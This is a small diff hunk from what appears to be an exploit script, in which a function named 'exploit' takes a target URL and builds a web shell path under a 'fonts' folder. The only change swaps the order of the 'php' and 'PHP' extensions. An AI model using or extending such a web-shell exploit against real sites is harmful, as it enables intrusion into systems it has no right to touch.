@@ -70,7 +70,7 @@ def clean_text(text):
         return str(text)
 
 def exploit(target_url):
-    extensions = ["php", "PHP"]
+    extensions = ["PHP", "php"]
     
     for ext in extensions:
         shell_path = "fonts/shxt." + ext
